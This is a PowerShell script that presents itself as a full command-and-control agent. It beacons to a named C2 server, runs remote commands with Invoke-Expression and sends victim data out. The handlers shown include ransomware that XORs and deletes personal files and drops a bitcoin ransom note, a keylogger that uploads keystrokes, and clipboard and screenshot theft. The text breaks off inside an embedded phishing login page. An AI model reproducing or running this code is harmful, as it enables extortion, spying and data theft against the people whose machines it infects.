# BomKaosKaki.ps1 - Full C2 Agent with Command Polling (Fixed)
# Two-way communication: sends heartbeats & exfil, polls for commands

# ============ CONFIGURATION ============
$C2Server = "https://bom-kaos-kaki.vercel.app"
$PollInterval = 15  # seconds between command polling
$HeartbeatInterval = 30  # seconds between heartbeats

# ============ RUNTIME STATE ============
$Script:SessionId = $null
$Script:KeyloggerRunning = $false
$Script:SpywareRunning = $false
$Script:RansomwareKey = $null
$Script:EncryptedFiles = @()
$Script:LastCommandPoll = (Get-Date)
$Script:LastHeartbeat = (Get-Date)

# ============ UTILITY FUNCTIONS ============

function Get-Timestamp {
    return (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
}

function Get-SessionId {
    param([int]$Length = 16)
    $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    # FIX: Gunakan Get-Random -Maximum, bukan operator %
    $id = -join ((1..$Length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $id
}

function Invoke-WebRequestWithRetry {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [object]$Body = $null,
        [int]$MaxRetries = 3
    )
    
    for ($i = 0; $i -lt $MaxRetries; $i++) {
        try {
            $params = @{
                Uri             = $Uri
                Method          = $Method
                UseBasicParsing = $true
                TimeoutSec      = 30
            }
            if ($Body) {
                $params["Body"] = ($Body | ConvertTo-Json -Compress -Depth 10)
                $params["ContentType"] = "application/json"
            }
            $response = Invoke-WebRequest @params
            $content = $response.Content
            if ($content) {
                try { 
                    return @{ success = $true; data = $content | ConvertFrom-Json }
                }
                catch { 
                    return @{ success = $true; data = $content }
                }
            }
            return @{ success = $true; data = $null }
        }
        catch {
            if ($i -eq $MaxRetries - 1) { 
                Write-Host "[!] Request failed after $MaxRetries retries: $_" -ForegroundColor Red 
            }
            Start-Sleep -Seconds 2
        }
    }
    return @{ success = $false; error = "Max retries exceeded" }
}

function Send-ExfilData {
    param(
        [string]$Type,
        [object]$Data,
        [string]$Filename = $null,
        [byte[]]$FileBytes = $null
    )
    
    try {
        if ($FileBytes -and $Filename) {
            $boundary = [System.Guid]::NewGuid().ToString()
            $bodyLines = @()
            $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
            $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`n$Type`r`n"
            $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$Filename`"`r`nContent-Type: application/octet-stream`r`n`r`n"
            $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "")
            $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
            $fullBody = New-Object byte[] ($bodyBytes.Length + $FileBytes.Length + $footerBytes.Length)
            [Buffer]::BlockCopy($bodyBytes, 0, $fullBody, 0, $bodyBytes.Length)
            [Buffer]::BlockCopy($FileBytes, 0, $fullBody, $bodyBytes.Length, $FileBytes.Length)
            [Buffer]::BlockCopy($footerBytes, 0, $fullBody, $bodyBytes.Length + $FileBytes.Length, $footerBytes.Length)
            
            Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST `
                -ContentType "multipart/form-data; boundary=$boundary" `
                -Body $fullBody -UseBasicParsing -TimeoutSec 30 | Out-Null
            return $true
        }
        else {
            $payload = @{
                session_id = $Script:SessionId
                type       = $Type
                data       = $Data
                timestamp  = Get-Timestamp
            }
            $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/exfil" -Method POST -Body $payload
            return $result.success
        }
    }
    catch {
        Write-Host "[!] Exfil failed: $_" -ForegroundColor Red
        return $false
    }
}

# ============ HEARTBEAT ============

function Send-Heartbeat {
    param([switch]$Force)
    
    $now = Get-Date
    if ((-not $Force) -and (($now - $Script:LastHeartbeat).TotalSeconds -lt $HeartbeatInterval)) {
        return $null
    }
    
    $Script:LastHeartbeat = $now
    
    $modules = @()
    if ($Script:KeyloggerRunning) { $modules += "keylogger" }
    if ($Script:SpywareRunning) { $modules += "spyware" }
    if ($Script:RansomwareKey) { $modules += "ransomware" }
    
    $payload = @{
        session_id = $Script:SessionId
        hostname   = $env:COMPUTERNAME
        username   = "$($env:USERDOMAIN)\$($env:USERNAME)"
        os_info    = (Get-WmiObject Win32_OperatingSystem).Caption
        ip         = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
        is_admin   = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        process_id = $PID
        modules    = $modules
        timestamp  = Get-Timestamp
    }
    
    $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/heartbeat" -Method POST -Body $payload
    return $result
}

# ============ COMMAND POLLING ============

function Invoke-CommandPoll {
    try {
        $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/get_commands?session_id=$($Script:SessionId)" -Method GET
        
        if ($result.success -and $result.data -and $result.data.commands) {
            foreach ($cmd in $result.data.commands) {
                Write-Host "[>] Executing command: $($cmd.command_type) (ID: $($cmd.id))" -ForegroundColor Cyan
                
                $cmdResult = $null
                $cmdError = $null
                $cmdStatus = "completed"
                
                try {
                    switch ($cmd.command_type) {
                        "exec" { $cmdResult = Invoke-ExecuteCommand $cmd }
                        "ransomware" { $cmdResult = Invoke-Ransomware $cmd }
                        "keylogger" { $cmdResult = Invoke-Keylogger $cmd }
                        "stop_keylogger" { $cmdResult = Stop-Keylogger $cmd }
                        "clipboard" { $cmdResult = Invoke-ClipboardSteal $cmd }
                        "screenshot" { $cmdResult = Invoke-Screenshot $cmd }
                        "phishing" { $cmdResult = Invoke-Phishing $cmd }
                        "spread" { $cmdResult = Invoke-Spread $cmd }
                        "persistence" { $cmdResult = Invoke-Persistence $cmd }
                        "spyware" { $cmdResult = Invoke-Spyware $cmd }
                        "clean" { $cmdResult = Invoke-CleanTraces $cmd }
                        "steal_browser" { $cmdResult = Invoke-StealBrowser $cmd }
                        "steal_wifi" { $cmdResult = Invoke-StealWiFi $cmd }
                        "system_info" { $cmdResult = Invoke-SystemInfo $cmd }
                        "uninstall" { $cmdResult = Invoke-Uninstall $cmd }
                        default { $cmdError = "Unknown command type: $($cmd.command_type)" }
                    }
                }
                catch {
                    $cmdStatus = "error"
                    $cmdError = $_.Exception.Message
                    Write-Host "[!] Command failed: $cmdError" -ForegroundColor Red
                }
                
                $report = @{
                    command_id   = $cmd.id
                    command_type = $cmd.command_type
                    session_id   = $Script:SessionId
                    status       = $cmdStatus
                    result       = $cmdResult
                    error        = $cmdError
                }
                
                Invoke-WebRequestWithRetry -Uri "$C2Server/api/command_complete" -Method POST -Body $report
                Write-Host "[+] Command $($cmd.id) completed with status: $cmdStatus" -ForegroundColor Green
            }
        }
    }
    catch {
        # Silently fail on poll errors
    }
}

# ============ COMMAND HANDLERS ============

function Invoke-ExecuteCommand {
    param($cmd)
    $script = $cmd.parameters.script
    if (-not $script) { return "No script provided" }
    
    try {
        $result = Invoke-Expression $script 2>&1 | Out-String
        return $result
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Invoke-SystemInfo {
    param($cmd)
    $info = @{}
    $info["ComputerName"] = $env:COMPUTERNAME
    $info["UserName"] = "$($env:USERDOMAIN)\$($env:USERNAME)"
    $info["OS"] = (Get-WmiObject Win32_OperatingSystem).Caption
    $info["OSVersion"] = (Get-WmiObject Win32_OperatingSystem).Version
    $info["Architecture"] = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    $info["CPU"] = (Get-WmiObject Win32_Processor).Name
    $info["RAM_GB"] = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $info["IP"] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
    $info["MAC"] = (Get-NetAdapter | Where-Object Status -eq "Up" | Select-Object -First 1).MacAddress
    $info["IsAdmin"] = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $info["Antivirus"] = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct 2>$null).displayName -join ", "
    $info["Processes"] = (Get-Process | Select-Object -First 30 Name, CPU, WorkingSet | ConvertTo-Json -Compress)
    
    Send-ExfilData -Type "system" -Data $info
    return ($info | ConvertTo-Json -Compress)
}

function Invoke-Ransomware {
    param($cmd)
    
    $key = [Convert]::ToBase64String([byte[]]::new(32))
    $Script:RansomwareKey = $key
    
    $targetDirs = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Pictures",
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Videos"
    )
    
    $extensions = @(".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".zip", ".rar", ".7z", ".sql", ".db", ".mdb", ".accdb", ".mp3", ".mp4", ".avi", ".mkv", ".php", ".html", ".css", ".js")
    
    $encrypted = 0
    $ransomNote = @"
===============================================
        YOUR FILES HAVE BEEN ENCRYPTED
===============================================

All your important documents, pictures, and files
have been encrypted with AES-256 encryption.

To recover your files, you must pay 0.1 BTC to
the following address:

  bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

After payment, contact us with your session ID:
  $($Script:SessionId)

DO NOT attempt to decrypt files yourself.
DO NOT use third-party recovery tools.
You will lose your data permanently.

Session ID: $($Script:SessionId)
===============================================
"@
    
    foreach ($dir in $targetDirs) {
        if (Test-Path $dir) {
            $files = Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | 
            Where-Object { $_.Extension -in $extensions }
            
            foreach ($file in $files) {
                try {
                    $content = [System.IO.File]::ReadAllBytes($file.FullName)
                    $encryptedContent = $content | ForEach-Object { $_ -bxor 0xAB }
                    $encryptedPath = "$($file.FullName).kaoskaki"
                    [System.IO.File]::WriteAllBytes($encryptedPath, $encryptedContent)
                    Remove-Item $file.FullName -Force
                    
                    $Script:EncryptedFiles += @{
                        original  = $file.FullName
                        encrypted = $encryptedPath
                    }
                    $encrypted++
                }
                catch {
                    Write-Host "[!] Failed to encrypt: $($file.FullName)" -ForegroundColor Red
                }
            }
        }
    }
    
    $notePath = "$env:USERPROFILE\Desktop\README_KAOSKAKI.txt"
    [System.IO.File]::WriteAllText($notePath, $ransomNote)
    
    $result = @{
        encrypted_count = $encrypted
        directories     = $targetDirs
        key             = "[REDACTED]"
        ransom_note     = $notePath
        session_id      = $Script:SessionId
    }
    
    Send-ExfilData -Type "ransomware" -Data $result
    return "Encrypted $encrypted files. Ransom note dropped."
}

function Invoke-Keylogger {
    param($cmd)
    
    if ($Script:KeyloggerRunning) {
        return "Keylogger already running"
    }
    
    $Script:KeyloggerRunning = $true
    $logPath = "$env:TEMP\kb_$($Script:SessionId).log"
    
    $Script:KeyloggerJob = Start-Job -ScriptBlock {
        param($sessionId, $c2Server, $logPath)
        
        Add-Type -AssemblyName System.Windows.Forms
        $lastWindow = ""
        $buffer = ""
        $lastSend = Get-Date
        
        # P/Invoke for GetAsyncKeyState and GetForegroundWindow
        $code = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class NativeMethods {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@
        Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
        
        $keyMap = @{
            8 = "[BACKSPACE]"; 9 = "[TAB]"; 13 = "[ENTER]`n"; 20 = "[CAPSLOCK]"
            27 = "[ESC]"; 32 = " "; 46 = "[DELETE]"; 45 = "[INSERT]"
            36 = "[HOME]"; 35 = "[END]"; 33 = "[PGUP]"; 34 = "[PGDN]"
            37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"; 40 = "[DOWN]"
            91 = "[WIN]"; 92 = "[WIN]"; 93 = "[MENU]"
        }
        
        # Shift key mapping for numbers
        $shiftNumbers = @{
            48 = ')'; 49 = '!'; 50 = '@'; 51 = '#'; 52 = '$'; 53 = '%'
            54 = '^'; 55 = '&'; 56 = '*'; 57 = '('
        }
        
        while ($true) {
            Start-Sleep -Milliseconds 50
            
            for ($i = 8; $i -le 190; $i++) {
                $state = [NativeMethods]::GetAsyncKeyState($i)
                # Check if key was just pressed (bit 15 set to 1)
                if ($state -band 0x8000) {
                    $keyChar = ""
                    $isShift = [NativeMethods]::GetAsyncKeyState(16) -band 0x8000
                    $isCaps = [Console]::CapsLock
                    
                    # Letter keys A-Z
                    if ($i -ge 65 -and $i -le 90) {
                        $char = [char]$i
                        if ($isShift -xor $isCaps) {
                            $keyChar = $char.ToString().ToUpper()
                        }
                        else {
                            $keyChar = $char.ToString().ToLower()
                        }
                    }
                    # Number keys 0-9
                    elseif ($i -ge 48 -and $i -le 57) {
                        if ($isShift -and $shiftNumbers.ContainsKey($i)) {
                            $keyChar = $shiftNumbers[$i]
                        }
                        else {
                            $keyChar = [char]$i
                        }
                    }
                    # Special keys
                    elseif ($keyMap.ContainsKey($i)) {
                        $keyChar = $keyMap[$i]
                    }
                    else {
                        # For other printable characters, try direct char mapping
                        $keyChar = [char]$i
                    }
                    
                    if ($keyChar -and $keyChar -ne "") {
                        $windowTitle = ""
                        $hwnd = [NativeMethods]::GetForegroundWindow()
                        if ($hwnd -ne [IntPtr]::Zero) {
                            $sb = New-Object System.Text.StringBuilder 256
                            if ([NativeMethods]::GetWindowText($hwnd, $sb, 256) -gt 0) {
                                $windowTitle = $sb.ToString()
                            }
                        }
                        
                        if ($windowTitle -ne $lastWindow -and $windowTitle -ne "") {
                            $buffer += "[ Window: $windowTitle ]`n"
                            $lastWindow = $windowTitle
                        }
                        
                        $buffer += $keyChar
                        
                        try {
                            [System.IO.File]::AppendAllText($logPath, $keyChar)
                        }
                        catch {}
                    }
                }
            }
            
            if ((Get-Date) - $lastSend -gt [TimeSpan]::FromSeconds(30) -and $buffer.Length -gt 0) {
                try {
                    $payload = @{
                        session_id = $sessionId
                        type       = "keylog"
                        data       = $buffer
                        timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                    }
                    $json = $payload | ConvertTo-Json -Compress
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("Content-Type", "application/json")
                    $webClient.UploadString("$c2Server/api/exfil", $json) | Out-Null
                    $buffer = ""
                    $lastSend = Get-Date
                }
                catch {}
            }
        }
    } -ArgumentList $Script:SessionId, $C2Server, $logPath
    
    return "Keylogger started. Log: $logPath"
}

function Stop-Keylogger {
    param($cmd)
    
    if (-not $Script:KeyloggerRunning) {
        return "Keylogger not running"
    }
    
    try {
        if ($Script:KeyloggerJob) {
            $Script:KeyloggerJob | Stop-Job -Force
            $Script:KeyloggerJob | Remove-Job -Force
        }
    }
    catch {}
    
    $Script:KeyloggerRunning = $false
    return "Keylogger stopped"
}

function Invoke-ClipboardSteal {
    param($cmd)
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
        
        $result = @{
            content = $clipboardText
            length  = $clipboardText.Length
        }
        
        Send-ExfilData -Type "clipboard" -Data $result
        return "Clipboard stolen ($($clipboardText.Length) chars)"
    }
    catch {
        return "Failed to steal clipboard: $($_.Exception.Message)"
    }
}

function Invoke-Screenshot {
    param($cmd)
    
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $ms.ToArray()
        $ms.Close()
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $filename = "screenshot_$($Script:SessionId)_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @()
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`nscreenshot`r`n"
        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$filename`"`r`nContent-Type: image/png`r`n`r`n"
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "")
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
        
        $fullBody = New-Object byte[] ($bodyBytes.Length + $bytes.Length + $footerBytes.Length)
        [Buffer]::BlockCopy($bodyBytes, 0, $fullBody, 0, $bodyBytes.Length)
        [Buffer]::BlockCopy($bytes, 0, $fullBody, $bodyBytes.Length, $bytes.Length)
        [Buffer]::BlockCopy($footerBytes, 0, $fullBody, $bodyBytes.Length + $bytes.Length, $footerBytes.Length)
        
        Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST `
            -ContentType "multipart/form-data; boundary=$boundary" `
            -Body $fullBody -UseBasicParsing -TimeoutSec 30 | Out-Null
        
        return "Screenshot captured and exfiltrated ($($bytes.Length) bytes)"
    }
    catch {
        return "Screenshot failed: $($_.Exception.Message)"
    }
}

function Invoke-Phishing {
    param($cmd)
    
    $phishingDir = "$env:TEMP\kaoskaki_phishing"
    New-Item -ItemType Directory -Force -Path $phishingDir | Out-Null
    
    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
        body { background-color: #ffffff; color: #111111; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; position: relative; }
        .doodle-bg { position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background-image: url('data:image/webp;base64,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